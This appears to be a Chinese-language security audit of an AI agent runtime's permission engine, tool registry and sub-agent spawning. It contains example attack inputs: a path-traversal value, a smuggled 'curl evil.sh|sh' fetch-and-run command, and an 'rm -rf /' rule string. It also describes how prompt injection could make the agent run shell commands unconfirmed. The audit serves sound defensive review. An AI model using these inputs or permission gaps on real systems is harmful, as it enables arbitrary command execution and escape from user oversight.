# rmc-agent-core.md — AC-R2 审计报告

## 节点头

- 节点：rmc-audit-cmp-001 / AC-R2
- tick：20260826T124800Z
- 审计范围：TriCompany 共享运行时 `packages/agent-core/src` 下 loop.ts、tools.ts、permissions.ts，permissions-engine/ 全部（rule-parser.ts / decision-pipeline.ts / safety-check.ts / types.ts / index.ts），sub-agent/ 全部（index.ts / spawn.ts / types.ts / tools-resolve.ts / built-in.ts），共 13 个源文件全部完整逐行 Read。
- 实例角色：TestEngineer（小柯），fresh 派工，一次一节点。
- 行号基准：下文所有 file:line 以 `/srv/fleet/TriCompany/packages/` 为根，行号来自本实例 Read 输出。

## 总体评估

该包分层与契约设计思路正确（依赖注入降级、有序决策管线、bypass-immune 安全检查），但权限面存在 4 处可直接利用的 P0 缺陷：路径边界校验可穿越、acceptEdits 模式对 shell 及一切非写入工具免确认放行、规则内容匹配退化为全文子串匹配、sub-agent 派生路径因配置丢弃而恒定落入 bypassPermissions。另有 10 项 P1（全局工具注册表多会话共享、超时后僵尸执行、失败熔断计数器每轮清零等）系统性削弱运行时防护。门禁建议：P0 修复并补齐模式矩阵与边界穿越回归测试之前，不应将该包接入任何非 bypass 场景的宿主。

## 发现清单

### P0（阻断级：可被利用或必然出错）

**P0-1 路径边界校验存在前缀混淆与目录穿越双重绕过**

- 位置：`agent-core/src/permissions-engine/decision-pipeline.ts:204-216`（isPathInBoundary）、`:199-201`（normalizePath）
- 问题：边界判定用裸字符串 `startsWith`（:215），既不保证分隔符边界也不解析 `..` 点段。两个独立绕过向量：(a) 兄弟目录前缀混淆——cwd 为 `/srv/fleet/TriCompany` 时，目标 `/srv/fleet/TriCompany-evil/x` 因共享前缀被判界内；(b) 相对路径点段穿越——`file_path: "../../etc/cron.d/payload"` 拼接后（:212）仍以 cwd 前缀开头，判界内，真实落点在界外。
- 触发场景：acceptEdits 或 dontAsk 模式下，模型输出（或被注入内容操纵的参数）携带上述路径即可越界写盘；dontAsk 声称的"界外全拒"契约（types.ts:18）被击穿。
- 修复建议：对目标与边界先做 `path.resolve()` 归一化，再要求目标等于边界或以 `boundary + path.sep` 开头；symlink 场景叠加 realpath 复核。

**P0-2 acceptEdits 模式把 shell_exec 及一切非文件写入工具免确认放行**

- 位置：`agent-core/src/permissions-engine/decision-pipeline.ts:225-233`（checkAcceptEditsMode 对非写入工具提前返回 allow）
- 问题：凡不在 `['write_file','edit_file']` 白名单的工具一律立即 `allowed:true` 返回（decidedBy=mode_accept_edits），管线第 9/10 步（allow 规则、default-deny）对该模式下所有此类工具不可达。shell_exec、任意 MCP 工具、自定义变更工具全部免确认执行。
- 触发场景：宿主以 acceptEdits 运行——用户按文档语义（types.ts:14-15"自动接受编辑"）以为非编辑操作仍需确认；提示注入诱导模型调用 shell_exec 即无确认命令执行。plan（:353）与 dontAsk（:263）都显式封了 shell，唯独 acceptEdits 遗漏，证明是实现缺口而非设计取舍。
- 修复建议：acceptEdits 仅对界内写入工具短路返回 allow，其余工具落入后续步骤走规则与 default 流程；补六模式×关键工具的决策矩阵测试。

**P0-3 规则内容匹配退化为"序列化全文任意位置子串匹配"，内容限定的 allow 规则可被子串注入绕过**

- 位置：`agent-core/src/permissions-engine/decision-pipeline.ts:417-430`（matchesContent：isWildcard 分支 ：425-427 与非通配分支 ：429 代码完全相同，死分支）；契约文档见 `rule-parser.ts:38-41`、`types.ts:107-109`（宣称 exact 与 wildcard 两种语义）
- 问题：匹配基准是 `JSON.stringify(args)` 的全文小写包含。"Bash(git push)" 这类声称精确匹配的 allow 规则，实际等价于"参数序列化文本任意位置含 git push"。模型提交 `echo git push && curl evil.sh|sh` 即命中该 allow 规则获得放行。
- 触发场景：宿主按文档用内容限定 allow 规则构建命令白名单时（这是标准用法），注入或越权的模型输出拼接合法子串即可执行任意命令——完整的权限绕过原语。
- 修复建议：非通配规则改为对提取出的 command/path 参数做锚定匹配（全等或规范化前缀）；通配规则锚定命令首部；删除或真实现 isWildcard 分支差异。

**P0-4 spawnAgent 丢弃全部权限配置，子代理恒定运行于 bypassPermissions 且无 cwd 边界**

- 位置：`agent-core/src/sub-agent/spawn.ts:31-39`（构造 loopOptions 未传 permissionMode/permissionRules/permissionEngine/cwd/deps/onPermissionAsk/signal）+ `agent-core/src/loop.ts:344-350`（permissionMode 缺省取 `'bypassPermissions'`，:346）
- 问题：SpawnConfig（types.ts:18-25）根本没有承载权限与 cwd 字段的通道，派生链路必然命中 loop 层的 fail-open 默认值。配合 P1-2（tier 执行期门控是可选 dep，spawn 从不提供）与全局工具注册表，子代理对注册表内全部工具具备实际执行面。
- 触发场景：任何使用 spawnAgent/spawnAgentComplete 的宿主，其子代理在提示注入下可无确认调用全局注册的任意工具；父会话配置的权限模式、规则、目录边界对子代理完全无效。
- 修复建议：SpawnConfig 增加权限字段透传；缺省继承宿主引擎或收敛至最严模式；loop 层裸默认值从 bypassPermissions 改为 default（与 PermissionEngine 构造器缺省一致，见 permissions-engine/index.ts:38）。

### P1（应尽快修复）

**P1-1 全局工具注册表为进程级单例，多循环/多会话互相污染**
- 位置：`agent-core/src/tools.ts:29`（模块级 Map）、`:37-42`（register 覆盖告警）、`:91-93`（unregister）、`:98-100`（clearRegistry）
- 问题与触发：常驻进程（TriLC daemon 多会话）中所有 agentLoop 共享同一注册表；一个会话的 McpClientManager 断连触发 unregister/clearRegistry 会连带摘除其他会话在用的工具；跨会话工具互见，会话 A 注册的私有 MCP 工具可被会话 B 的代理按名调用执行。
- 建议：注册表下沉到 loop/session 作用域，或引入命名空间隔离并让 clearRegistry 只作用本作用域。

**P1-2 tier 强制仅作用于模型可见清单，执行期复核是可选 dep**
- 位置：`agent-core/src/loop.ts:587-603`（仅当 `deps.checkToolPermission` 存在才做 tier 门控）、`agent-core/src/tools.ts:61-71`（executeTool 无任何 tier 复核）、`permissions.ts:84-89`
- 问题与触发：tier 过滤只裁剪提供给模型的 ToolDefinition 清单；未接 gater 的宿主中，受限 tier 代理直接猜名调用 shell_exec 照样进 executeTool 执行（叠 P0-4 的 bypass 引擎后畅通无阻）。
- 建议：executeTool 内置最低 tier 校验，或将 gater 由可选变为必选契约。

**P1-3 TC-1 续跑轮向历史重复注入同一条 assistant 消息**
- 位置：`agent-core/src/loop.ts:489-492`（已 push assistantMsg）与 `:501-506`（continue 分支再次 push 同一 assistantMsg）
- 问题与触发：end_turn 且配置 continuePrompt 时，下一轮请求历史中该 assistant 消息出现两份，上下文 token 翻倍且可能扰乱模型对自身发言的定位。
- 建议：续跑分支改为 `[...state.messages, userMessage]`，并补续跑轮消息序列断言测试。

**P1-4 isError 以 `'"error"'` 子串猜测判定，合法结果被计为失败并可触发误熔断**
- 位置：`agent-core/src/loop.ts:615`（`resultContent.includes('"error"')`）、误熔断出口 `:664-674`
- 问题与触发：工具返回 `{"status":"error"}` 这类合法负载（测试报告、日志查询）即被判错；连续三次（同一轮批次内）整任务被误中止。审计/测试类任务批量读取错误处理相关文件时高发。
- 建议：由 ToolHandler 以结构化约定（ctx 返回对象带 isError 字段）上报错误，禁止子串猜测。

**P1-5 连续失败熔断与重复错误检测的状态每轮清零，防死循环护栏基本失效**
- 位置：`agent-core/src/loop.ts:520-524`（TOOL_TIMEOUT_MS、toolResults、consecutiveToolFailures、lastToolErrors 全部声明在 while(true) 体内，循环体起点 ：372）
- 问题与触发：计数器与 lastToolErrors 映射每个对话轮重建，"每轮调用一次同一失败工具"的经典死循环永远累计不到 3 次；repeat-error 检测（:630-646）窗口被压缩到单轮并行批次内，几乎不可能触发。
- 建议：状态提升到循环外按会话累计，阈值与重置策略显式化并配测试。

**P1-6 工具超时不清理计时器且不取消底层执行——僵尸工具在超时后继续运行**
- 位置：`agent-core/src/loop.ts:610-614`（setTimeout 创建后从不 clearTimeout；toolPromise 未接入 AbortSignal）
- 问题与触发：超时后对外报 tool_blocked，但 shell_exec 等实际仍在后台执行并持续写盘，系统状态与上报事实背离；每次工具调用遗留一个最长 120s 的悬挂计时器，拖住事件循环延缓进程优雅退出。
- 建议：race 结束即 clearTimeout；给 executeTool/ToolContext 增加 signal 并在超时时中止子进程。

**P1-7 安全检查 FILE_MODIFYING_TOOLS 漏掉 replace_in_file，bypass-immune 敏感路径防护可绕过**
- 位置：`agent-core/src/permissions-engine/safety-check.ts:36-39`（Set 仅含 write_file/edit_file）对照 `permissions.ts:49-51`（replace_in_file 被明确列为写工具）
- 问题与触发：经 replace_in_file 写 `.git/hooks/pre-commit`、`.claude/` 等敏感路径不触发任何模式下的安全拦截，与 write_file 同操作不同命运。
- 建议：该集合与 TOOL_TIER_ALLOWLIST 的写工具集对齐，并加"新增写工具必须同步安全检查集合"的一致性测试。

**P1-8 dontAsk 终局兜底 auto-allow 一切未列名工具；plan 模式写操作识别靠硬编码黑名单+名字关键词**
- 位置：`agent-core/src/permissions-engine/decision-pipeline.ts:318-324`（非文件工具直接 allow）、`:350-354`（plan 写工具硬编码表）、`:330-343`（MCP 关键词启发）
- 问题与触发：改名/自定义工具（run_cmd、apply_patch、mcp__db__execute 等）绕过 dontAsk 的 shell 封禁与 plan 的只读保证；黑名单式启发天然滞后于新工具注册。
- 建议：改为能力白名单——工具注册时声明 capability 元数据，模式判定按 capability 匹配。

**P1-9 内置 test_runner 定义自相矛盾，按定义必然无法工作**
- 位置：`agent-core/src/sub-agent/built-in.ts:15-22`（tier `'subagent'` 却申请 shell_exec）对照 `permissions.ts:53-55`（shell_exec 仅 main tier）
- 问题与触发：该内置代理的 shell_exec 既被 tier 清单过滤剔除（loop.ts:305），执行期也会被拒，"运行测试"职能必然失败。
- 建议：提升 tier 至 main，或拆分为只读分析与受控执行两个定义。

**P1-10 AgentDefinition.tools 声明不被 spawn 执行，resolveSubAgentTools 为无人调用的死代码**
- 位置：`agent-core/src/sub-agent/spawn.ts:31-39`（未消费 agent.tools）、`tools-resolve.ts:34-41`（resolveSubAgentTools 全仓无调用方）、`sub-agent/index.ts:1-3`（未导出该函数）
- 问题与触发：声明最小工具集的代理实际拿到的是 tier 过滤后的整个注册表（正方向越权，如 file_processor tier=main 拿到全部工具而非声明的 4 个）；反方向则如 P1-9 所示被过度裁剪。
- 建议：spawn 接入 resolveSubAgentTools 并从 index 导出；定义与解析结果为空或不一致时报错而非静默。

### P2（改进建议）

**P2-1** JSON.parse 失败静默吞掉并将 args 置空（`loop.ts:529-536`）：权限引擎与工具都在错误参数上做决策，模型收到误导性缺参报错；应以 parse 错误作为 tool_result 回填。

**P2-2** classifyError 正则过宽（`loop.ts:181-187`）：`/auth/i` 会命中含 "author" 的消息，`/5\d\d/` 命中任意形如 5xx 的数字片段，错误分类漂移导致 Tier1/2 恢复策略误选。

**P2-3** transient 重试零延迟无退避（`loop.ts:413-432`）：对限流端点形成即时重击；应加入指数退避与上限。

**P2-4** 流式 tool_call 名字拼接不对称（`loop.ts:256-270`，尤其 ：260）：arguments 同时兼容累积快照与增量分片两种协议（:263-267），name 却只按增量拼接处理，快照型提供方会产出 "rearead_file" 类损坏工具名。

**P2-5** onPermissionAsk 返回值 fail-open（`loop.ts:543-564`）：仅 `'deny'` 拦截（:549），回调异常返回 undefined 时视为放行；应白名单化 allow/always、其余按 deny。

**P2-6** AbortSignal 仅在循环顶部检查（`loop.ts:372-377`），未传入流式请求与工具执行（:610）：取消延迟可达 120 秒以上。

**P2-7** spawn 超时仅在事件间检查（`spawn.ts:47-59`）：挂死的模型流不产事件则永不触发；超时后也只发 error 不发终态 done。

**P2-8** tier 盲类型转换无校验（`spawn.ts:34`）叠加 `loop.ts:353-355` 的 `tierCounts[tier]` 直接索引：非法 tier 字符串以晦涩 TypeError 崩溃而非清晰校验错误。

**P2-9** rule-parser 对畸形输入静默截断（`rule-parser.ts:58`，slice 只剥一个右括号）：`"Bash(rm -rf /"` 这类未闭合规则内容被悄悄改写，无任何告警。

**P2-10** 别名映射跨模块不一致：Grep 在 `rule-parser.ts:19-20` 映射到 glob_search，在 `tools-resolve.ts:15` 映射到 search_code，同一来源名两套语义。

**P2-11** 文档漂移：`permissions-engine/index.ts:3` 自称 "7-step decision pipeline"，`decision-pipeline.ts:1-4` 实为 10 步。

**P2-12** safety-check 的 task 工具分支是恒 false 桩（`safety-check.ts:81-86`）：注释声称"任何模式下 spawn 都需额外确认"，实现返回 `{ triggered: false }`，死代码且与注释相反。

**P2-13** SubAgentStatus 的 idle/completed/cancelled 无任何写入路径（`sub-agent/types.ts:5`），状态机未实现，纯死枚举值。

**P2-14** 敏感路径保护双标：MCP 参数检查覆盖 .env/.ssh/id_rsa 等（`safety-check.ts:98-111`），原生写工具的 SENSITIVE_PATHS（`:11-16`）仅 .git/.claude——bypass 模式下经原生工具写 .env 不触发拦截，等价 MCP 写却被拦。

## 发现计数表

| 级别 | 计数 |
| --- | --- |
| P0 | 4 |
| P1 | 10 |
| P2 | 14 |

## 测试判断与门禁评估

- 测试判断：FAIL（当前状态不建议放行非 bypass 场景接入）。P0-1/2/3/4 均属"可被利用"级权限缺陷，且 P0-4 使全部子代理链路默认暴露。
- 覆盖缺口说明：本次为静态逐行审计，未执行动态验证（无该包测试基线可依托，范围内未见 loop/permissions-engine 对应 __tests__ 目录，仅 message-guard/process-supervisor/scheduler 有测试文件）；P0 结论均给出确定性代码路径证据，建议修复后以模式矩阵+穿越用例回归固化。
- 使用依据：本报告全部结论基于上列 13 个源文件的直接 Read 证据，行号可复核；未引用任何二手测试结论。
